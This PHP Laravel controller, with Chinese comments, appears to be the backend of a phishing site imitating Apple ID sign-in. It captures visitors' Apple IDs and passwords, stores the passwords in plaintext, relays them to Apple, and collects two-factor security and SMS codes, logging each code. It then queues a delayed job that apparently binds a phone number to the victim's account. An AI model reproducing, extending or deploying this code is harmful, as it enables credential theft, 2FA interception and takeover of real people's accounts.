<?php

namespace App\Http\Controllers;

use App\Apple\Service\Apple;
use App\Apple\Service\AppleFactory;
use App\Apple\Service\DataConstruct\ServiceError;
use App\Apple\Service\Exception\AccountLockoutException;
use App\Apple\Service\Exception\UnauthorizedException;
use App\Apple\Service\Exception\VerificationCodeIncorrect;
use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
use App\Apple\Service\User\UserFactory;
use App\Events\AccountAuthFailEvent;
use App\Events\AccountAuthSuccessEvent;
use App\Events\AccountLoginSuccessEvent;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifyCodeRequest;
use App\Jobs\BindAccountPhone;
use App\Models\Account;
use App\Models\SecuritySetting;
use Carbon\Carbon;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;
use libphonenumber\NumberParseException;
use libphonenumber\PhoneNumberFormat;

class IndexController extends Controller
{
    public function __construct(
        protected readonly Request $request,
        private readonly AppleFactory $appleFactory,
        private readonly PhoneNumberFactory $phoneNumberFactory,
    )
    {

    }

    protected function getAccount(): ?Account
    {
        return $this->request->user();
    }

    protected function getApple():?Apple
    {
        return $this->request->attributes->get('apple');
    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Response
    {
        $guid = sha1(microtime());
//        $apple = $this->appleFactory->create($guid);

//        $apple->bootstrap();

        return response()
            ->view('index/signin')
            ->withCookie(Cookie::make('Guid', $guid,30));
    }

    protected function getCountryCode():?string
    {
        return SecuritySetting::first()?->configuration['country_code'] ?? null;
    }

    protected function formatPhone(string $phone): string
    {
        if (empty($countryCode = $this->getCountryCode())) {
            return $phone;
        }

        try {

            return $this->phoneNumberFactory->createPhoneNumberService(
                $phone,
                $countryCode,
                PhoneNumberFormat::INTERNATIONAL
            )->format();

        } catch (NumberParseException $e) {
            return $phone;
        }
    }

    /**
     * @param VerifyAccountRequest $request
     * @return JsonResponse
     * @throws AccountLockoutException
     * @throws GuzzleException
     * @throws UnauthorizedException|ConnectionException|\Illuminate\Http\Client\RequestException
     */
    public function verifyAccount(VerifyAccountRequest $request): JsonResponse
    {
        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
        // 获取验证过的数据
        $validatedData = $request->validated();

        // 获取 accountName
        $accountName = $validatedData['accountName'];

        // 获取 password
        $password = $validatedData['password'];

        $validator = Validator::make(['email' => $accountName], [
            'email' => 'email',
        ]);

        // 不是有效的邮箱,那就是手机号
        if ($validator->fails()) {
            $accountName = $this->formatPhone($accountName);
        }

        //毫秒时间戳
        $guid = $request->cookie('Guid');

        $apple = $this->appleFactory->create($guid);

        $apple->clear();
        $apple->getUser()->set('account', $accountName);
        $apple->getUser()->set('password', $password);

        $response = $apple->signin($accountName, $password);

        $account = Account::updateOrCreate([
            'account' => $accountName,
        ],[ 'password' => $password]);

        $error = $response->firstAuthServiceError()?->getMessage();
        Session::flash('Error',$error);

        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功 {$error}"));

        if ($response->hasTrustedDevices() || $response->getTrustedPhoneNumbers()->count() === 0){
            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => true,
                'Error' => $error,
            ],code: 201);
        }

        if ($response->getTrustedPhoneNumbers()->count() >= 2){
            return $this->success(data: [
                'Guid' => $guid,
                'Devices' => false,
                'Error' => $error,
            ],code: 202);
        }

        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers()->first();

        return $this->success(data: [
            'Guid' => $guid,
            'Devices' => false,
            'ID' => $trustedPhoneNumbers->getId(),
            'Number' => $trustedPhoneNumbers->getNumberWithDialCode(),
            'Error' => $error,
        ],code: 203);

    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     * @throws GuzzleException
     * @throws UnauthorizedException|ConnectionException
     */
    public function authPhoneList(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
    {
        $response = $this->getApple()->auth();

        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers();
        return view('index.auth-phone-list',['trustedPhoneNumbers' => $trustedPhoneNumbers]);
    }

    /**
     * 验证安全码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws VerificationCodeIncorrect|ConnectionException
     */
    public function verifySecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();
        $code = $validated['apple_verifycode'];
        $guid = $this->request->input('Guid');

        $account = $this->getAccount();

        try {

            $response = $this->getApple()->validateSecurityCode($code);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));
        } catch (VerificationCodeIncorrect $e) {
            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "安全码验证失败 {$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($account->id,$guid)
            ->delay(Carbon::now()->addSeconds(10));

        return $this->success($response->json() ?? []);
    }

    protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
    {
        return Account::where('account', $accountName)->first();
    }

    /**
     * 验证手机验证码
     * @param VerifyCodeRequest $request
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws VerificationCodeIncorrect
     * @throws ConnectionException
     */
    public function smsSecurityCode(VerifyCodeRequest $request): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();

        if (empty($Id = $validated['ID'])){
            throw new VerificationCodeIncorrect('手机号码ID不能为空');
        }

        $code = $validated['apple_verifycode'];

        $guid = $this->request->input('Guid');

        $account = $this->getAccount();

        // 验证手机号码
        try {

            $response = $this->getApple()->validatePhoneSecurityCode($code,(int) $Id);

            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));
        } catch (VerificationCodeIncorrect|UnauthorizedException|ConnectionException $e) {
            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "{$e->getMessage()}"));
            throw $e;
        }

        BindAccountPhone::dispatch($account->id,$guid)
            ->delay(Carbon::now()->addSeconds(10));

        return $this->success($response->json() ?? []);
    }

    /**
     * 获取安全码
     * @return JsonResponse
     * @throws UnauthorizedException|ConnectionException
     */
    public function SendSecurityCode(): JsonResponse
    {
        $apple = $this->getApple();

        try {

            $response = $apple->idmsa->sendSecurityCode()->json();

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => '获取安全码成功',
                ]);

        } catch (\Exception $e) {

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '获取安全码',
                    'description' => "获取安全码失败:{$e->getMessage()}",
                ]);

            throw $e;
        }

        return $this->success($response);
    }

    /**
     * 获取手机号码
     * @return JsonResponse
     * @throws UnauthorizedException
     * @throws GuzzleException|ConnectionException
     */
    public function GetPhone(): JsonResponse
    {
        $response = $this->getApple()->auth();

        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();

        return $this->success([
            'ID'                  => $trustedPhoneNumbers?->getId(),
            'Number'              => $trustedPhoneNumbers?->getNumberWithDialCode(),
        ]);
    }

    /**
     * 发送验证码
     * @return JsonResponse|Redirector
     * @throws ValidationException
     * @throws \Exception
     */
    public function SendSms(): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:1'
        ])->validated();

        try {

            $response = $this->getApple()->sendPhoneSecurityCode((int) $params['ID']);

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '发送手机验证码',
                    'description' => "发送手机验证码成功",
                ]);

        } catch (\Exception $e) {

            $this->getAccount()
                ->logs()
                ->create([
                    'action' => '发送手机验证码',
                    'description' => "发送手机验证码失败:{$e->getMessage()}",
                ]);

            throw $e;
        }

        /**
         * @var $error ServiceError
         */
        $error = $response->getServiceErrors()->first();

        Session::flash('Error',$error?->getMessage());

        return $this->success($response->json());
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }
}
